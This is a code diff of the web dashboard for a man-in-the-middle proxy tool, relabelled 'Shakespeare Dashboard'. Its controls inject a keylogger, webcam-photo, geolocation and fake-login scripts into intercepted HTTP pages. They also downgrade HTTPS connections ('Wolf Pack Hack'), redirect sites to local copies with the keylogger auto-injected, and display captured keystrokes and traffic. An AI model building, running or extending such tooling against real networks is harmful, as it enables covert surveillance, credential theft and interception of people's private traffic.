@@ -5,73 +5,178 @@
   <div class="container">
     <div class="row">
       <div class="hero-text">
-        <h1>MITM Dashboard</h1>
+        <h1>Shakespeare Dashboard</h1>
+        <h4 class="attackType">disabled...</h4>
         <p></p>
       </div>
     </div>
   </div>
 </header>
-<!-- force HAR flush with: http://127.0.0.1:8080/har -->
-  <div class="nav" id="wrapper">
-    <div class="nav third" class="buttons">
-      <ul>
-      <li><button type="button" id="replace">Replace All Images</button></li>
-      <li><button type="button" id="flip">Flip Images</button></li>
-      <li><button type="button" id="redirect">Redirect pages</button>the list of pages you can redirect...</li>
-      <li>
-        Remember to url encode e.g: <pre>&lt;script&gt;alert(1)%3B&lt;/script&gt;</pre>
-        Replace: <input type="text" id="find"  />
-        With: <input type="text" id="result"  />
-        <button type="button" id="inject">Inject Hook in HTTP</button>
-      </li>
-      <li><button type="button" id="block">Block URLs</button></li>
-      <li><button type="button" id="intercept">Wolf Pack Hack</button></li>
-    </ul>
-    </div>
-    <div class="nav third">
-      <ul id='hars-discovered'></ul>
-    </div> <!-- har viewer here -->
-    <div class="nav third" id='har-view'></div> <!-- har viewer here -->
-  </div>
-    <div id="keypresses">
-      <script>
-      // $( document ).ready(function(){
-      //     $.get( "http://127.0.0.1:9000/App/GetData", function( data ) {
-      //       $('#keypresses').append(data + "<br>")
-      //     });}, 1000);
-      </script>
-    </div>
+  <div class="col-md-12">
+    <div class="btn-group col-md-6">
+      <div class="btn-primary">Proxy Controls</div>
+      <button class="toplevel btn btn-default" id="passthrough" title="This will allow all connections through, however the requests and responses will be stored as HAR files and any body that is sent with the request can be viewed in the HAR viewer below.">Simple Proxy</button>
 
+
+        <button class="toplevel btn btn-default" type="button" id="replaceImages" title="this currently does not work"><s>Replace All Images</s></button>
+        <button class="toplevel btn btn-default" type="button" id="flipImages" title="this currently does not work"><s>Flip Images</s></button>
+        <button class="toplevel btn btn-default" type="button" id="redirect" title="This will check if the site is in the array of sites to redirect, and if so will redirect to a local page with the same name i.e ft.com will get redirected to ft.html - NOTE: All redirected pages have the key logger automatically injected into them.">Redirect URLs</button>
+        <button class="toplevel btn btn-default" type="button" id="block" title="This will block sites that are in the list of sites to block however it cannot handle HSTS ">Block URLs</button>
+        <div class="btn-group">
+          <button type="button" class="toplevel btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="See the tool tips of the children of this. Different scripts for different injections. All scripts get an automatic jquery injection">
+          Inject Hook in HTTP <span class="caret"></span>
+          </button>
+          <ul class="dropdown-menu" role="menu">
+            <div class="btn-group">
+            <button class="btn btn-default" id="keylogger" title="This will inject a keylogger into the page if it can (i.e HTTP).">keylogger</button>
+            <button class="btn btn-default" id="takePhoto" title="This will inject a script to attempt to take a photo with the web cam on the clients computer">Take Photo</button>
+            <button class="btn btn-default" id="getLocation" title="This will inject a script to attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.">Get Location</button>
+            <button class="btn btn-default" id="requestLogin" title="This will inject a script to attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.">Request User Login</button>
+            <button id="" class="btn btn-info disabled">Add more here</button>
+          </div>
+          </ul>
+        </div>
+        <button class="toplevel btn btn-default" type="button" id="intercept" 
+        title="This will attempt to stop the clients request and make the same request itself. It will then pass the response from the server back to the client, but over HTTP. If it experiences HSTS then it will block the request. It is recommended to try and get the user to click on links to pages that are HSTS where possible.">Wolf Pack Hack</button>
+    </div>
+    <div class="btn-group col-md-6">
+      <div class="btn-primary">Dashboard</div>
+        <div class="btn-group">
+          <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="See the hars collected for each client">
+          View Hars <span class="caret"></span>
+          </button>
+          <ul class="dropdown-menu" role="menu">
+            <button class="btn btn-info" id="gethars">Get Hars</button>
+            <button class="btn btn-danger" id="deletehars">Delete current data</button>
+            <div class="btn-group" id="clients">
+            </div>
+          </ul>
+        </div>
+        <button id="getKeyLogs" class="btn btn-default">View Key logging</button>
+        <button id="getWifi" class="btn btn-default" title="this is to discover the SSIDs that devices are trying to connect to. Useful for creating hotspots for targetted attacks"><s>Discover Local Wifi Requests</s></button>
+        
+        <div class="btn-group">
+          <button id="createAccessPoint" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="Create an access point"><s>Create access point</s><span class="caret"></span>
+          </button>
+          <ul class="dropdown-menu">
+            <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
+
+          </ul>
+        </div>
+
+    </div>
+  </div>
+    <div class="col-md-4"><h2>Key logs</h2></div>
+    <div class="col-md-8"><h2>Har viewer</h2></div>
+    <div class="col-md-4" id='userLogs'></div>  
+    <div class="col-md-8" id='har-view'></div> <!-- har viewer here -->
+    <div class="col-md-12"><h2><s>Wifi Requests</s></h2></div>
+    <div class="col-md-12" id='wifi-requests'></div> <!-- har viewer here -->
 
 <script type="text/javascript">
-  $("#replace").click(function() {
-    $.get( "/ReplaceImages", function( data ) {
+
+  $(".toplevel").click(function() {
+    $(".btn").removeClass("btn-success")
+    $(this).addClass("btn-success")
+  })
+  $("#passthrough").click(function() {
+    $.get( "/PassThrough", function( data ) {
+      $(".attackType").html("Simple - capture headers")
+    });
+  })
+  $("#deletehars").click(function() {
+     $.get( "/App/DeleteHars", function( data ) {
+      $.each(data, function(i, d) {
+        var descr = d.split("_", -1)
+        console.log(descr)
+        $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
+      })
     });
   })
   $("#intercept").click(function() {
     $.get( "/InterceptHTTPS", function( data ) {
+      $(".attackType").html("Wolf Pack Hack - remove HTTPS")
     });
   })
-  $("#flip").click(function() {
-    $.get( "/FlipImages", function( data ) {
-    });
+  $("#flipImages").click(function() {
+    alert("flipping images currently disabled")
+    // $.get( "/FlipImages", function( data ) {
+    //   $(".attackType").html("Flip Images")
+    // });
+  })
+  $("#replaceImages").click(function() {
+    alert("Replacing images currently disabled")
+    // $.get( "/FlipImages", function( data ) {
+    //   $(".attackType").html("Flip Images")
+    // });
   })
   $("#redirect").click(function() {
-    $.get( "/ReplacePage", function( data ) {
+    $.get( "/RedirectPage", function( data ) {
+      $(".attackType").html("Redirect Websites: " + data)
     });
   })
   $("#block").click(function() {
     $.get( "/BlockWebsites", function( data ) {
+      $(".attackType").html("Block Websites: " + data)
     });
   })
-  $("#inject").click(function() {
-    var find = $("#find").val();
-    var result = $("#result").val();
-    console.log(find)
-    console.log(result)
-    $.get( "/InjectScript?replace="+find+"&result="+result, function( data ) {
+  $("#keylogger").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - Keylogger")
     });
   })
+ $("#getLocation").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request location")
+    });
+  })
+ $("#takePhoto").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request photo")
+    });
+  })
+   $("#requestLogin").click(function() {
+    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+      $(".attackType").html("Injected - request Login")
+    });
+  })
+  $("#getKeyLogs").click(function() {
+    $('#userLogs').html("")//clear
+      $.get("/App/GetData", function ( data ) {
+        var lastURL = data[0].Page
+        $('#userLogs').append(lastURL+"<p>")
+        $.each(data, function(i, j) {
+          if ( j.Page === lastURL ) {
+            $('#userLogs').append(j.Content)
+          } else {
+            $('#userLogs').append("<p>"+j.Page)
+            $('#userLogs').append(j.Content)
+          }
+          lastURL = j.Page          
+        })
+        
+      })
+      
+  })
+  //get the hars that have been collected
+  //update for each connected client
+  $("#gethars").click(function() {
+    $("#clients").html("")
+    $.getJSON("/App/GetHars", function( data ) {
+    $(".attackType").html("Injected - Get Har Files")
+    $.each(data, function(i, j) {
+      var descr = j.split("_", -1)
+      var listItem = $('<button class=" har btn btn-default" id="'+j+'">'+descr[1]+' : ' + descr[2]+'</button>').click(function() {
+        $.getJSON( "/public/hars/"+j, function( data ) {
+            var har = $('#har-view').data('HarView');
+            har.render(data);
+        });
+      })
+      $("#clients").append(listItem) 
+    })
+  })
+  })
+
 </script>
 
 
@@ -79,25 +184,11 @@
 //get the latest hars that are available
 $(document).ready(function() {
  $('#hars-discovered').empty()
- $('#har-view').empty();
-  $.getJSON("/App/GetHars", function( data ) {
-    $.each(data, function(i, j) {
-      var listItem = $("<li class='har' id='"+j+"'>"+j+"</li>").click(function() {
-        console.log(j)
-        // console.log(" click click click " + $(this).attr("id"))
-        $.getJSON( "/public/hars/"+j, function( data ) {
-            $('#har-view').HarView();
-            var har = $('#har-view').data('HarView');
-            har.render(data);
-        });
-      })
-      $('#hars-discovered').append(listItem)
-    })
-  })
+ $('#har-view').html();
+ $('#har-view').HarView();
+
 })
 
-// }, 2000);
 </script>
-
 
 {{template "footer.html" .}}
